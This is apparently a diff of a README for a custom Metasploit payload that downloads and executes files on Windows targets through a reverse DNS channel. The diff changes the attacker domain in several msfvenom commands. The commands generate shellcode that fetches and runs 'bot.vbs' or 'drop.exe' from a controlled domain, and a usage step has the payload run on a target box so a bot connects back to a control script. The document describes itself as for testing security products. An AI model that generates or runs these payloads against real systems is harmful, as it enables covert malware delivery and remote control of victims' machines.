@@ -11,7 +11,7 @@ This project created for testing NextGen security solutions. Not allowed to use 
 
 Metasploit payload: X86 download and exec via reverse DNS channel. Jut put this file into msf3 payload folder and then you could use it like that:
 
-     mssfvenom -p windows/dns_download_exec_svchost DOMAIN=a.0x41.ws EXT=vbs -f js_le | sed -s 's/\%/\\/g'
+     mssfvenom -p windows/dns_download_exec_svchost DOMAIN=a.zlo.ws EXT=vbs -f js_le | sed -s 's/\%/\\/g'
 
 DOMAIN - domain you should control (NS).
 
@@ -29,7 +29,7 @@ those IPv6 will be resolve even if no IPv6 address assigned to the interface (on
  abaa.a.dom.ws - ...
  cbaa.a.dom.ws - for example last peace of data (in this case we have flag of last pice in first 4 bits of second byte)
  
- Maximum size: up to 88 Mb (zzzz.dom.ws)
+ Maximum size: up to 88 Mb (zzzz.zlo.ws)
  Download Speed: ~ 4 Kb/sec
  Shellcode size: 833 bytes (no null bytes by default)
  
@@ -93,11 +93,11 @@ So now it "stores" two drop files in a.zlo.ws and in b.zlo.ws
 
 If you want shellcode download and exec bot.vbs
  
-        mssfvenom -p windows/dns_download_exec_svchost DOMAIN=a.0x41.ws EXT=vbs -f js_le
+        mssfvenom -p windows/dns_download_exec_svchost DOMAIN=a.zlo.ws EXT=vbs -f js_le
         
 If you want shellcode download and exec drop.exe
  
-        mssfvenom -p windows/dns_download_exec_svchost DOMAIN=b.0x41.ws EXT=exe -f js_le
+        mssfvenom -p windows/dns_download_exec_svchost DOMAIN=b.zlo.ws EXT=exe -f js_le
         
 9) Run exploit with shellocde on target box, and then (if bot.vbs used) wait when BOT from the box will be connected to revdns.pl
 
